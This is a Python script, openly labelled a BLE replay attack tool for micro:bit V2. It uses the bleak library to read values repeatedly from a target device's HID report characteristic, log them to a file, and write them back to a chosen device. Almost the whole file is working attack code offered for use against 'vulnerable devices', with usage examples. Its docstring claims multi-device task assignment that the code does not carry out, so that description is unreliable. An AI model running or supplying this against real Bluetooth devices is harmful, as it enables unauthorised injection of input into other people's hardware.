# microbit_ble_replay_attack.py

"""
BLE Replay Attack for micro:bit V2 (Multi-Device Support)

This script captures and replays BLE packets to exploit vulnerable devices.
- Detects available micro:bit devices and assigns tasks dynamically
- Captures BLE packets for replay (`--capture <target_mac> <output_file>`)
- Replays captured packets to a BLE device (`--replay <target_mac> <input_file>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Capture BLE packets:
   ```sh
   python microbit_ble_replay_attack.py --capture AA:BB:CC:DD:EE:FF packets.bin
   ```

2. Replay captured BLE packets:
   ```sh
   python microbit_ble_replay_attack.py --replay AA:BB:CC:DD:EE:FF packets.bin
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
import datetime
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# Capture BLE Packets
async def ble_capture(target_mac, output_file):
    """Captures BLE packets from a target device."""
    print(f"[+] Capturing BLE packets from {target_mac}...")
    captured_packets = []
    async with BleakClient(target_mac) as client:
        while True:
            try:
                data = await client.read_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb")
                timestamp = datetime.datetime.now().isoformat()
                captured_packets.append(f"{timestamp} | {target_mac} | {data.hex()}")
                print(f"[+] Captured Packet: {data.hex()}")
                with open(output_file, "a") as f:
                    f.write(f"{timestamp} | {target_mac} | {data.hex()}\n")
            except Exception as e:
                print(f"[-] Error capturing packet: {e}")
            await asyncio.sleep(0.1)

# Replay Captured BLE Packets
async def ble_replay(target_mac, input_file):
    """Replays captured BLE packets to a target device."""
    print(f"[+] Replaying captured BLE packets to {target_mac}...")
    with open(input_file, "r") as f:
        packets = [line.strip().split(" | ")[-1] for line in f.readlines()]
    async with BleakClient(target_mac) as client:
        for packet in packets:
            try:
                data = bytes.fromhex(packet)
                await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", data)
                print(f"[+] Replayed Packet: {packet}")
            except Exception as e:
                print(f"[-] Error replaying packet: {e}")
            await asyncio.sleep(0.1)

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Replay Attack for micro:bit V2")
    parser.add_argument("--capture", nargs=2, metavar=("target_mac", "output_file"), help="Capture BLE packets for replay")
    parser.add_argument("--replay", nargs=2, metavar=("target_mac", "input_file"), help="Replay captured BLE packets")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.capture:
        loop.run_until_complete(ble_capture(args.capture[0], args.capture[1]))
    elif args.replay:
        loop.run_until_complete(ble_replay(args.replay[0], args.replay[1]))
